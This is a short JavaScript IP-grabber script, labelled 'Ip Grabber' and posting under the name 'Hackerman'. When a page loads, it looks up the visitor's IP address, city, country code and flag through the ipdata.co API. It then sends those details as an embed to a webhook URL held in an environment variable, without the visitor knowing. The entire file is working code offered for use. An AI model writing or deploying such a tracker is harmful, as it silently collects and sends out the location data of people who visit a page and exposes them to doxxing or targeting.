const webhook = process.env.WEBHOOKDC;
const APIKEY = process.env.APIKEY;

function json(url) {
    return fetch(url).then(res => res.json());
  }
  
  let apiKey = APIKEY;
  json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
    document.write(data.ip);
    document.write(data.city);
    document.write(data.country_code);
    document.write(data.flag);
 


    var params = {
        username: "Hackerman",
        avatar_url: "https://www.bing.com/th?id=OIP.-5lCfjZOvlnVq_gfuabtEAHaEK&w=199&h=110&c=8&rs=1&qlt=90&dpr=1.1&pid=3.1&rm=2",
        embeds: [
            {
                "title": "Ip Grabber",
                "color": 15258703,
                "thumbnail": {
                    "url": "https://tse3.mm.bing.net/th/id/OIP.3NyIAM389m8kXEa-D_WaGQHaEK?w=314&h=180&c=7&o=5&dpr=1.1&pid=1.7",
                },
                "fields": [
                    {
                        "name": "Ip:",
                        "value": data.ip,
                        "inline": true
                    },
                    {
                        "name": "Town:",
                        "value": data.city,
                        "inline": true
                    },
                    {
                        "name": "Country",
                        "value": data.country_code,
                        "inline": true
                    },
                    {
                        "name": "Flag",
                        "value": data.flag,
                        "inline": true
                    }
                ]
            }
        ]
    }

    fetch(webhook, {
        method: "POST",
        headers: {
            'Content-type': 'application/json'
        },
        body: JSON.stringify(params)
    })
  });
